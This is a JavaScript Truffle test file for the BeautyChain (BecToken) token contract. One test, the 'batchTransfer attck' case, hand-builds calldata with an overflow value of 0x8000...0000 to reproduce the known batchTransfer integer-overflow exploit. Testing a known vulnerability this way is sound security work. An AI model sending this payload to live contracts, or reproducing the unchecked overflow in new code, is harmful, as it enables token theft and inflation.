var helper = require('../../helpers/web3Eth');

var BigNum = require('../../helpers/bignumber');

'use strict';

const BigNumber = web3.BigNumber

require('chai')
    .use(require('chai-as-promised'))
    .use(require('chai-bignumber')(BigNumber))
    .should()

var account0 = web3.eth.accounts[0];
var account1 = web3.eth.accounts[1];
var account2 = web3.eth.accounts[2];
var account3 = web3.eth.accounts[3];
var account4 = web3.eth.accounts[4];
var account5 = web3.eth.accounts[5];
var account6 = web3.eth.accounts[6];
var account7 = web3.eth.accounts[7];
var account8 = web3.eth.accounts[8];
var account9 = web3.eth.accounts[9];

var result;

var BecToken = artifacts.require('../contracts/BecToken.sol');

contract('BecToken', function ([_, owner]) {
    let token;
    let seq = 0;

    beforeEach(async function () {
        token = await BecToken.new({
            from: owner
        });
        seq++;
        console.log(helper.SPACE10, "New contract address:", token.address);
    });

    it('case @ should have correct information', async function () {

        const decimals = await token.decimals();
        const name = await token.name();
        const symbol = await token.symbol();
        const totalSupply = await token.totalSupply();
        decimals.should.be.bignumber.equal(18);
        name.should.equal('BeautyChain');
        totalSupply.should.be.bignumber.equal( 7e+27 );
    });

    it(seq + ' case @ batchTransfer attck:', async function () {
        let b3 = await token.balanceOf(account3);
        console.log(helper.SPACE10, "balance of account3 (before attack):", b3.toNumber());

        console.log(helper.SPACE10, "地址： Account3", account3,'Owner:',owner, 'Contract Address', token.address);

        token.allEvents(helper.callbackEvent);
        let data1 = 
        "0x"+
        "83f12fec"+
        "0000000000000000000000000000000000000000000000000000000000000040"+
        "8000000000000000000000000000000000000000000000000000000000000000"+
        "0000000000000000000000000000000000000000000000000000000000000002"+
        "000000000000000000000000d4de18319360b51beaa28a7af22728bd8181bd91"+
        "000000000000000000000000d4de18319360b51beaa28a7af22728bd8181bd92";

        let result = await web3.eth.call({from:owner, to:token.address, data:data1});
        console.log(helper.SPACE10, "result:", result);

        b3 = await token.balanceOf(account3);
        console.log(helper.SPACE10, "balanceOf(account3)", b3.valueOf());
        b3.toString().should.not.equal("0");

        // const totalSupply = await token.totalSupply();
        // console.log("totalSupply", totalSupply.valueOf());
    });

    it(seq + ' case @ batchTransfer', async function () {
        let b3 = await token.balanceOf(account3);
        
        // Error: VM Exception while processing transaction: revert
        await token.batchTransfer([account3, account3], web3.toWei(1, "ether"), { //0x8000000000000000000000000000000000000000000000000000000000000000, {
            from: owner
        });
        b3 = await token.balanceOf(account3);
        assert.equal(b3, web3.toWei(2, "ether"), "验证batchTransfer操作失败");
    });
});